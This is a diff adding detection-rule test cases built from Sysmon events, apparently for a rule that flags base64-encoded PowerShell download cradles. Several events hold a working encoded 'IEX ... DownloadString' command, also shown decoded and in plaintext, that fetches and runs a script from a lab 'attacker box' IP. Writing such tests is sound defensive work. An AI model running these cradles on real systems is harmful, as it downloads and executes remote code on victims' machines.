@@ -1,0 +1,103 @@
+# Behaviour tests for win_encoded_powershell_cradle.yml
+#
+# The base64 blobs below are real. Decode any of them with:
+#   [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<blob>'))
+
+rule: win_encoded_powershell_cradle.yml
+
+true_positives:
+
+  - name: Encoded IEX download cradle pointing at the attacker box
+    # Decodes to:
+    #   IEX (New-Object Net.WebClient).DownloadString('http://10.13.37.40/u.ps1')
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      OriginalFileName: PowerShell.EXE
+      CommandLine: >-
+        powershell.exe -nop -w hidden -enc
+        SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAzAC4AMwA3AC4ANAAwAC8AdQAuAHAAcwAxACcAKQA=
+      ParentImage: C:\Windows\System32\cmd.exe
+      User: NEXUS\s.alqahtani
+      IntegrityLevel: Medium
+
+  - name: Same cradle abbreviated to -e and launched from Word
+    # Attackers use the shortest accepted prefix to dodge naive string matching.
+    # Parent process winword.exe makes this a textbook phishing execution chain.
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      CommandLine: >-
+        powershell -e
+        SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAzAC4AMwA3AC4ANAAwAC8AdQAuAHAAcwAxACcAKQA=
+      ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+      User: NEXUS\a.alharbi
+      IntegrityLevel: Medium
+
+false_positives:
+
+  - name: Encoded command with no cradle - benign inventory collection
+    # Decodes to: Get-ComputerInfo | ConvertTo-Json | Out-File C:\temp\inv.json
+    # Encoded, but downloads nothing. Must stay silent, otherwise every managed
+    # estate generates thousands of these a day.
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      CommandLine: >-
+        powershell.exe -NoProfile -EncodedCommand
+        RwBlAHQALQBDAG8AbQBwAHUAdABlAHIASQBuAGYAbwAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAdABlAG0AcABcAGkAbgB2AC4AagBzAG8AbgA=
+      ParentImage: C:\Windows\System32\taskeng.exe
+      User: NT AUTHORITY\SYSTEM
+
+  - name: Plaintext download cradle - caught by a different rule, not this one
+    # Deliberately not matched here: this rule is specifically about the
+    # encoded variant. Overlapping rules that both fire produce duplicate
+    # alerts and make triage worse, so each keeps a distinct scope.
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      CommandLine: powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://10.13.37.40/u.ps1')"
+      ParentImage: C:\Windows\System32\cmd.exe
+      User: NEXUS\s.alqahtani
+
+  - name: ExecutionPolicy Bypass with a normal script path
+    # The -e prefix regex must not fire on -ExecutionPolicy.
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\LabTools\generate-noise.ps1
+      ParentImage: C:\Windows\System32\svchost.exe
+      User: NT AUTHORITY\SYSTEM
+
+  - name: SCCM agent running an encoded cradle against internal infrastructure
+    # Real cradle, but from the management agent. Allow-listed by ParentImage.
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      CommandLine: >-
+        powershell.exe -nop -enc
+        SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAzAC4AMwA3AC4ANAAwAC8AdQAuAHAAcwAxACcAKQA=
+      ParentImage: C:\Windows\CCM\CcmExec.exe
+      User: NT AUTHORITY\SYSTEM
+
+  - name: Non-PowerShell process with a base64 argument
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\certutil.exe
+      CommandLine: certutil.exe -encode C:\temp\in.txt C:\temp\out.b64
+      ParentImage: C:\Windows\System32\cmd.exe
+      User: NEXUS\f.alzahrani
